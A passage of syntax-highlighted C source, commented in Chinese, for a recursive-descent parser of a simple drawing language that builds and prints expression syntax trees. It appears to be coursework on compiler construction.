function">PrintSyntaxTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">,</span> <span class="token keyword">int</span> indent<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先序遍历打印语法树</span>   <span class="token comment">//非终结符递归子程序声明 有2类</span>   <span class="token comment">//第1类，语法分析，不构造语法树，因此语句的子程序均设计为过程->void类型的函数，非终结符的递归子程序声明</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Origin语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Rot语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Scale语句</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//For语句</span>   <span class="token comment">//第2类，语法分析+构造语法树，因此表达式均设计为返回值为指向语法树节点的指针的函数。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//表达式、二元加减运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//乘除运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//一元加减运算表达式</span> <span class="token comment">//把项和因子独立开处理解决了加减号与乘除号的优先级问题。在这几个过程的反复调用中，始终传递fsys变量的值，保证可以在出错的情况下跳过出错的符号，使分析过程得以进行下去。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//幂运算表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//原子表达式</span>   <span class="token comment">//对外接口声明</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//语法树构造函数声明</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">MakeExprNode</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> opcode<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//通过词法分析器接口GetToken获得一个记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token <span class="token operator">=</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> ERRTOKEN<span class="token punctuation">)</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//如果得到的记号是非法输入errtoken，则指出一个语法错误</span><span class="token punctuation">&#125;</span><span class="token comment">//匹配当前记号</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">MatchToken</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">!=</span> The_Token<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//若失败，指出语法错误</span><span class="token punctuation">&#125;</span><span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//若成功，获取下一个</span><span class="token punctuation">&#125;</span><span class="token comment">//语法错误处理</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token keyword">int</span> case_of<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>case_of<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span>LineNo<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"错误记号 "</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>lexeme<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span>LineNo<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token string">"不是预期记号"</span><span class="token punctuation">,</span> token<span class="token punctuation">.</span>lexeme<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//打印错误信息</span><span class="token keyword">void</span> <span class="token function">ErrMsg</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> LineNo<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>descrip<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>string<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> msg<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">sprintf</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token string">"Line No %5d:%s %s !"</span><span class="token punctuation">,</span> LineNo<span class="token punctuation">,</span> descrip<span class="token punctuation">,</span> string<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MessageBoxA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token string">"error!"</span><span class="token punctuation">,</span> MB_OK<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//先序遍历打印语法树，根-左-右</span><span class="token keyword">void</span> <span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>root<span class="token punctuation">,</span> <span class="token keyword">int</span> indent<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> temp<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span>temp <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> temp <span class="token operator">&lt;=</span> indent<span class="token punctuation">;</span> temp<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//缩进</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> PLUS<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> MINUS<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> MUL<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> DIV<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> POWER<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%x\n"</span><span class="token punctuation">,</span> root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>MathFuncPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%f\n"</span><span class="token punctuation">,</span> root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> <span class="token string">"T"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Error Tree Node !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode <span class="token operator">==</span> CONST_ID <span class="token operator">||</span> root<span class="token operator">-></span>OpCode <span class="token operator">==</span> T<span class="token punctuation">)</span> <span class="token comment">//叶子节点返回</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//常数和参数只有叶子节点 常数：右值；参数：左值地址</span><span class="token keyword">if</span> <span class="token punctuation">(</span>root<span class="token operator">-></span>OpCode <span class="token operator">==</span> FUNC<span class="token punctuation">)</span><span class="token comment">//递归打印一个孩子节点</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//函数有孩子节点和指向函数名的指针</span><span class="token keyword">else</span><span class="token comment">//递归打印两个孩子节点</span><span class="token punctuation">&#123;</span><span class="token comment">//二元运算：左右孩子的内部节点</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">PrintSyntaxTree</span><span class="token punctuation">(</span>root<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right<span class="token punctuation">,</span> indent <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//绘图语言解释器入口（与主程序的外部接口）</span><span class="token keyword">void</span> <span class="token function">Parser</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>SrcFilePtr<span class="token punctuation">)</span><span class="token comment">//语法分析器的入口</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">InitScanner</span><span class="token punctuation">(</span>SrcFilePtr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//初始化词法分析器</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open Source File Error !\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">FetchToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先获得一个记号</span><span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//然后进入Program递归子程序，递归下降分析</span><span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭词法分析器</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//程序Program的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Program</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">!=</span> NONTOKEN<span class="token punctuation">)</span><span class="token comment">//记号类型不为空</span><span class="token punctuation">&#123;</span><span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//程序有多个语句</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>SEMICO<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//直到匹配到分隔符</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句Statment的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">Statement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//罗列四种语句类型，分别分析</span><span class="token keyword">case</span> ORIGIN<span class="token operator">:</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> SCALE<span class="token operator">:</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> ROT<span class="token operator">:</span>  <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FOR<span class="token operator">:</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span> <span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//否则报错</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句OriginStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">OriginStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token comment">//语法树节点的类型</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>ORIGIN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Origin_x = GetExprValue(tmp);//获取横坐标点平移距离</span><span class="token comment">//DelExprTree(tmp);//删除一棵树</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Origin_y = GetExprValue(tmp);//获取纵坐标点平移距离</span><span class="token comment">//DelExprTree(tmp);//删除一棵树</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句ScaleStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ScaleStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>SCALE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Scale_x = GetExprValue(tmp);//获取横坐标的比例因子</span><span class="token comment">//DelExprTree(tmp);</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Scale_y = GetExprValue(tmp);//获取纵坐标的比例因子</span><span class="token comment">//DelExprTree(tmp);</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//语句RotStatement的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">RotStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>ROT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>IS<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Rot_angle = GetExprValue(tmp);//获得旋转角度</span><span class="token comment">//DelExprTree(tmp);</span><span class="token punctuation">&#125;</span><span class="token comment">//语句ForStatement的递归子程序</span><span class="token comment">//对右部文法符号的展开->遇到终结符号直接匹配，遇到非终结符就调用相应子程序</span><span class="token comment">//ForStatement中唯一的非终结符是Expression，他出现在5个不同位置，分别代表循环的起始、终止、步长、横坐标、纵坐标，需要5个树节点指针保存这5棵语法树</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ForStatement</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//eg:for T from 0 to 2*pi step pi/50 draw (t, -sin(t));</span><span class="token keyword">double</span> Start<span class="token punctuation">,</span> End<span class="token punctuation">,</span> Step<span class="token punctuation">;</span><span class="token comment">//绘图起点、终点、步长</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>start_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>end_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>step_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>x_ptr<span class="token punctuation">,</span> <span class="token operator">*</span>y_ptr<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FOR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FROM<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//eg:for T from</span>start_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Tree_trace</span><span class="token punctuation">(</span>start_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获得参数起点表达式的语法树</span><span class="token comment">//Start = GetExprValue(start_ptr);//计算参数起点表达式的值</span><span class="token comment">//DelExprTree(start_ptr);//释放参数起点语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>TO<span class="token punctuation">)</span><span class="token punctuation">;</span>end_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Tree_trace</span><span class="token punctuation">(</span>end_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造参数终点表达式语法树</span><span class="token comment">//End = GetExprValue(end_ptr);//计算参数终点表达式的值</span><span class="token comment">//DelExprTree(end_ptr);//释放参数终点语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>STEP<span class="token punctuation">)</span><span class="token punctuation">;</span>step_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Tree_trace</span><span class="token punctuation">(</span>step_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造参数步长表达式语法树</span><span class="token comment">//Step = GetExprValue(step_ptr);//计算参数步长表达式的值</span><span class="token comment">//DelExprTree(step_ptr);//释放参数步长语法树所占空间</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>DRAW<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>x_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">Tree_trace</span><span class="token punctuation">(</span>x_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>COMMA<span class="token punctuation">)</span><span class="token punctuation">;</span>y_ptr <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">Tree_trace</span><span class="token punctuation">(</span>y_ptr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//DrawLoop(Start, End, Step, x_ptr, y_ptr); //绘制图形</span><span class="token comment">//DelExprTree(x_ptr);//释放横坐标语法树所占空间</span><span class="token comment">//DelExprTree(y_ptr);//释放纵坐标语法树所占空间</span><span class="token punctuation">&#125;</span><span class="token comment">//（二元加减运算）表达式Expression的递归子程序，与上边不太相同的是，表达式需要为其构造语法树</span><span class="token comment">//把函数设计为语法树节点的指针，在函数内引进2个语法树节点的指针变量，分别作为Expression左右操作数（Term）的语法树节点指针</span><span class="token comment">//表达式应该是由正负号或无符号开头、由若干个项以加减号连接而成。</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//展开右部，并且构造语法树</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span><span class="token comment">//左右子树节点指针</span>Token_Type token_tmp<span class="token punctuation">;</span><span class="token comment">//当前记号</span>left <span class="token operator">=</span> <span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分析左操作数得到其语法树，左操作数是一个乘除运算表达式</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> PLUS <span class="token operator">||</span> token<span class="token punctuation">.</span>type <span class="token operator">==</span> MINUS<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token_tmp <span class="token operator">=</span> token<span class="token punctuation">.</span>type<span class="token punctuation">;</span><span class="token comment">//当前记号是加/减</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配记号</span>right <span class="token operator">=</span> <span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//分析右操作数得到其语法树，右操作数是一个乘除运算表达式</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//构造运算的语法树，结果为左子树</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token comment">//返回的是当前记号节点</span><span class="token punctuation">&#125;</span><span class="token comment">//乘除运算表达式Term的递归子程序</span><span class="token comment">//项是由若干个因子以乘除号连接而成</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Term</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>Token_Type token_tmp<span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> MUL <span class="token operator">||</span> token<span class="token punctuation">.</span>type <span class="token operator">==</span> DIV<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>token_tmp <span class="token operator">=</span> token<span class="token punctuation">.</span>type<span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>token_tmp<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span 